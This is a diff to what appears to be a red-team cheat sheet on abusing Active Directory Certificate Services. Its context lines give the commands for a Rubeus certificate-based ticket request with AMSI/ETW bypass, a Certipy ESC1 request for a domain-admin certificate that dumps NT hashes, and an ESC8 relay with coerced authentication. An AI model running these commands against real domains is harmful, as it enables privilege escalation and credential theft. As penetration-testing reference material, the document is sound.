@@ -850,17 +850,16 @@ $assem = [System.Reflection.Assembly]::Load($data)
       * `inlineExecute-Assembly --dotnetassembly Rubeus.exe --assemblyargs asktgt /user:<da> /certificate:C:\Windows\Tasks\cert.pfx /password:<pfx_password> /ptt --amsi --etw`
    * Verify
       * `ls \\dc1.bamisoup.com\c$`
+
 * Certipy - ESC1
   * https://github.com/ly4k/Certipy
   * Check vulnerable for certificate templates
     * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
   * Request certificate with alternative name
-    * `certipy req -u <user> -p <pass> -ca <ca-name> -target <servername> -template <template> -upn administrator@test.local`
+    * `certipy req -u <user> -p <pass> -ca <ca-name> -target <servername> -template <template> -upn <da>`
   * Authenticate (dumps NT hash and TGT)
     * `certipy auth -pfx administrator.pfx -dc-ip <ip>`
 * Certipy - ESC8
-  * Check vulnerable for certificate templates
-    * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
   * Start relay
     * `certipy relay -ca <ca-server>`
   * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
